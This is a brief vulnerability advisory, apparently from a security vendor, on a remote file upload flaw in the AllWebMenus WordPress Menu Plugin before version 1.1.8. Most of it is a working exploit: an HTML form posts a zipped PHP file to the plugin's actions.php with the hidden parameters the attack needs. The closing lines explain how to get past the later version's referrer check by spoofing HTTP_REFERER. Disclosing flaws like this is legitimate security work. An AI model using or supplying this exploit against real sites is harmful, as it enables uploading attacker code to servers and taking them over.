AllWebMenus WordPress Menu Plugin
<1.1.8  Remote File upload

On versions < 1.1.8 , lack of checks in script actions.php allowed malicious user to upload any file to the vulnerable server.
Create a file (For example, Wordpress_security.php , with this content <?php echo '6Scan to the rescue';  ?> )
Compress it with zip to awm.zip

Use this form to upload the php file to the server

<form action="http://192.168.0.197/wp-content/plugins/allwebmenus-wordpress-menu-plugin/actions.php" method=post enctype="multipart/form-data">
<input type="file" name="awm1" size=100>
<input type="hidden" name="AWM_menu_id" value="2134234">
<input type="hidden" name="theaction" value="zip_update">
<input type=submit>
</form>


Version 1.1.8 also checks the source referrer, so you have to use scripting language (or spoof it in another way) to set the HTTP_REFERER to 
"wp-admin/options-general.php?page=allwebmenus-wordpress-menu-plugin/allwebmenus-wordpress-menu.php"
